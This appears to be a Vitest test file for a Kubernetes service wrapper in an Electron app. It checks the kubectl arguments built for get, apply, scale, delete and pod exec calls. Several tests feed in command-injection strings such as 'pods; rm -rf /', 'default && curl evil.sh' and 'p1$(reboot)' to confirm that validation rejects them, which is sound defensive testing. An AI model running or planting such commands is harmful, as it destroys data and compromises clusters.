import { describe, it, expect, vi, beforeEach } from 'vitest';
import { KubernetesService } from '../services/kubernetes/kubernetes-service';
import { resourceReadCache } from '../services/kubernetes/resource-read-cache';
import { pluginEventBus } from '../services/plugins/plugin-events';
import { safeExec } from '../utils/safe-exec';
import fs from 'fs/promises';

// Mock dependencies
vi.mock('../utils/safe-exec', () => ({
  safeExec: vi.fn(),
  ALLOWED_TOOLS: new Set(['kubectl', 'kind', 'k3d']),
}));

vi.mock('fs/promises', () => ({
  default: {
    writeFile: vi.fn().mockResolvedValue(undefined),
    unlink: vi.fn().mockResolvedValue(undefined),
  },
  writeFile: vi.fn().mockResolvedValue(undefined),
  unlink: vi.fn().mockResolvedValue(undefined),
}));

vi.mock('electron', () => ({
  app: {
    getPath: vi.fn().mockReturnValue('/mock/temp'),
  },
}));

vi.mock('../services/plugins/plugin-events', () => ({
  pluginEventBus: {
    emitResourceCreated: vi.fn(),
    emitResourceUpdated: vi.fn(),
    emitResourceDeleted: vi.fn(),
  },
}));

const mockSafeExec = vi.mocked(safeExec);

function execResolves(stdout: string) {
  mockSafeExec.mockResolvedValue({ stdout, stderr: '' });
}

/** The args array of the last safeExec('kubectl', args) call. */
function lastArgs(): string[] {
  const call = mockSafeExec.mock.calls.at(-1);
  return (call?.[1] as string[]) ?? [];
}

describe('KubernetesService', () => {
  let service: KubernetesService;

  beforeEach(() => {
    vi.clearAllMocks();
    // The read cache is a module singleton — isolate tests from each other
    resourceReadCache.clear();
    service = new KubernetesService();
  });

  describe('getResources', () => {
    it('should fetch resources using kubectl', async () => {
      const mockItems = [{ metadata: { name: 'pod-1' } }];
      execResolves(JSON.stringify({ items: mockItems }));

      const items = await service.getResources('pods', 'default');
      expect(items).toEqual(mockItems);
      expect(mockSafeExec).toHaveBeenCalledWith('kubectl', [
        'get',
        'pods',
        '-n',
        'default',
        '-o',
        'json',
      ]);
    });

    it('should handle namespace all', async () => {
      execResolves(JSON.stringify({ items: [] }));

      await service.getResources('pods', 'all');
      expect(lastArgs()).toContain('-A');
      expect(lastArgs()).not.toContain('-n');
    });

    it('should include context flag when contextName is supplied', async () => {
      execResolves(JSON.stringify({ items: [] }));

      await service.getResources('pods', 'default', 'staging-context');
      expect(lastArgs()).toEqual(
        expect.arrayContaining(['--context', 'staging-context'])
      );
    });

    it('should return empty array when items is missing from response', async () => {
      execResolves(JSON.stringify({}));

      const result = await service.getResources('pods', 'default');
      expect(result).toEqual([]);
    });

    it('should throw on error', async () => {
      mockSafeExec.mockRejectedValue(new Error('K8S Error'));

      await expect(service.getResources('pods', 'default')).rejects.toThrow(
        'K8S Error'
      );
    });

    it('should reject invalid resource types (injection attempt)', async () => {
      await expect(
        service.getResources('pods; rm -rf /', 'default')
      ).rejects.toThrow('Invalid resource type');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });

    it('should reject invalid namespaces (injection attempt)', async () => {
      await expect(
        service.getResources('pods', 'default && curl evil.sh')
      ).rejects.toThrow('Invalid namespace');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });

    it('should reject invalid context names (injection attempt)', async () => {
      await expect(
        service.getResources('pods', 'default', 'ctx `whoami`')
      ).rejects.toThrow('Invalid context name');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });
  });

  describe('createResource', () => {
    it('should create resource from manifest', async () => {
      const manifest = { kind: 'Pod', metadata: { name: 'p1' } };
      execResolves('created');

      await service.createResource(manifest);
      expect(fs.writeFile).toHaveBeenCalled();
      expect(lastArgs()[0]).toBe('apply');
      expect(lastArgs()).toContain('-f');
      expect(pluginEventBus.emitResourceCreated).toHaveBeenCalledWith(manifest);
    });

    it('should include context flag in createResource', async () => {
      const manifest = { kind: 'Pod', metadata: { name: 'p1' } };
      execResolves('created');

      await service.createResource(manifest, 'prod-context');
      expect(lastArgs()).toEqual(
        expect.arrayContaining(['--context', 'prod-context'])
      );
    });

    it('should clean up temp file even when kubectl fails', async () => {
      const manifest = { kind: 'Pod', metadata: { name: 'p1' } };
      mockSafeExec.mockRejectedValue(new Error('apply failed'));

      await expect(service.createResource(manifest)).rejects.toThrow(
        'apply failed'
      );
      expect(fs.unlink).toHaveBeenCalled();
    });
  });

  describe('updateResource', () => {
    it('should update resource from manifest', async () => {
      const manifest = { kind: 'Pod', metadata: { name: 'p1' } };
      execResolves('updated');

      await service.updateResource('pods', 'p1', manifest);
      expect(fs.writeFile).toHaveBeenCalled();
      expect(lastArgs()[0]).toBe('apply');
      expect(pluginEventBus.emitResourceUpdated).toHaveBeenCalledWith(manifest);
    });

    it('should include context flag in updateResource', async () => {
      const manifest = { kind: 'Pod', metadata: { name: 'p1' } };
      execResolves('updated');

      await service.updateResource('pods', 'p1', manifest, 'dev-context');
      expect(lastArgs()).toEqual(
        expect.arrayContaining(['--context', 'dev-context'])
      );
    });

    it('should clean up temp file even when kubectl fails', async () => {
      const manifest = { kind: 'Pod', metadata: { name: 'p1' } };
      mockSafeExec.mockRejectedValue(new Error('update failed'));

      await expect(
        service.updateResource('pods', 'p1', manifest)
      ).rejects.toThrow('update failed');
      expect(fs.unlink).toHaveBeenCalled();
    });
  });

  describe('scaleResource', () => {
    it('should scale a deployment with the expected kubectl args', async () => {
      execResolves('');

      await service.scaleResource('deployments', 'web', 'default', 3);
      expect(mockSafeExec).toHaveBeenCalledWith('kubectl', [
        'scale',
        'deployments/web',
        '--replicas=3',
        '-n',
        'default',
      ]);
      expect(pluginEventBus.emitResourceUpdated).toHaveBeenCalledWith({
        type: 'deployments',
        name: 'web',
        namespace: 'default',
        replicas: 3,
      });
    });

    it('should include context flag when contextName is supplied', async () => {
      execResolves('');

      await service.scaleResource('statefulsets', 'db', 'prod', 5, 'prod-ctx');
      expect(lastArgs()).toEqual(
        expect.arrayContaining(['--context', 'prod-ctx'])
      );
    });

    it('should allow scaling to zero', async () => {
      execResolves('');

      await service.scaleResource('deployments', 'web', 'default', 0);
      expect(lastArgs()).toContain('--replicas=0');
    });

    it('should reject non-scalable resource types', async () => {
      await expect(
        service.scaleResource('pods', 'p1', 'default', 3)
      ).rejects.toThrow(/cannot be scaled/);
      expect(mockSafeExec).not.toHaveBeenCalled();
    });

    it('should reject negative, fractional, and oversized replica counts', async () => {
      for (const bad of [-1, 1.5, 1001, NaN]) {
        await expect(
          service.scaleResource('deployments', 'web', 'default', bad)
        ).rejects.toThrow(/Invalid replica count/);
      }
      expect(mockSafeExec).not.toHaveBeenCalled();
    });

    it('should reject invalid resource names', async () => {
      await expect(
        service.scaleResource(
          'deployments',
          'web; kubectl delete ns prod',
          'default',
          3
        )
      ).rejects.toThrow();
      expect(mockSafeExec).not.toHaveBeenCalled();
    });
  });

  describe('deleteResource', () => {
    it('should delete resource', async () => {
      execResolves('deleted');

      await service.deleteResource('pods', 'p1', 'default');
      expect(lastArgs()).toEqual(['delete', 'pods', 'p1', '-n', 'default']);
      expect(pluginEventBus.emitResourceDeleted).toHaveBeenCalled();
    });

    it('should omit namespace flag when namespace is empty string', async () => {
      execResolves('deleted');

      await service.deleteResource('pods', 'p1', '');
      expect(lastArgs()).not.toContain('-n');
    });

    it('should omit namespace flag when namespace is "all"', async () => {
      execResolves('deleted');

      await service.deleteResource('pods', 'p1', 'all');
      expect(lastArgs()).not.toContain('-n');
    });

    it('should include context flag in deleteResource', async () => {
      execResolves('deleted');

      await service.deleteResource('pods', 'p1', 'default', 'prod-context');
      expect(lastArgs()).toEqual(
        expect.arrayContaining(['--context', 'prod-context'])
      );
    });

    it('should throw on delete error', async () => {
      mockSafeExec.mockRejectedValue(new Error('delete failed'));

      await expect(
        service.deleteResource('pods', 'p1', 'default')
      ).rejects.toThrow('delete failed');
    });

    it('should reject invalid resource names (injection attempt)', async () => {
      await expect(
        service.deleteResource('pods', 'p1; kubectl delete ns prod', 'default')
      ).rejects.toThrow('Invalid resource name');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });
  });

  describe('executeCommand', () => {
    it('should execute command in pod', async () => {
      execResolves('output');

      const result = await service.executeCommand('p1', 'default', 'ls');
      expect(result).toBe('output');
      expect(lastArgs()).toEqual(['exec', 'p1', '-n', 'default', '--', 'ls']);
    });

    it('should split multi-word commands into args after --', async () => {
      execResolves('output');

      await service.executeCommand('p1', 'default', 'cat /etc/hosts');
      expect(lastArgs()).toEqual([
        'exec',
        'p1',
        '-n',
        'default',
        '--',
        'cat',
        '/etc/hosts',
      ]);
    });

    it('should include context flag when contextName is supplied', async () => {
      execResolves('output');

      await service.executeCommand('p1', 'default', 'ls', 'my-context');
      expect(lastArgs()).toEqual(
        expect.arrayContaining(['--context', 'my-context'])
      );
    });

    it('should throw on exec error', async () => {
      mockSafeExec.mockRejectedValue(new Error('exec failed'));

      await expect(
        service.executeCommand('p1', 'default', 'ls')
      ).rejects.toThrow('exec failed');
    });

    it('should reject invalid pod names (injection attempt)', async () => {
      await expect(
        service.executeCommand('p1$(reboot)', 'default', 'ls')
      ).rejects.toThrow('Invalid resource name');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });

    it('should reject empty commands', async () => {
      await expect(
        service.executeCommand('p1', 'default', '   ')
      ).rejects.toThrow('Empty command');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });
  });
});
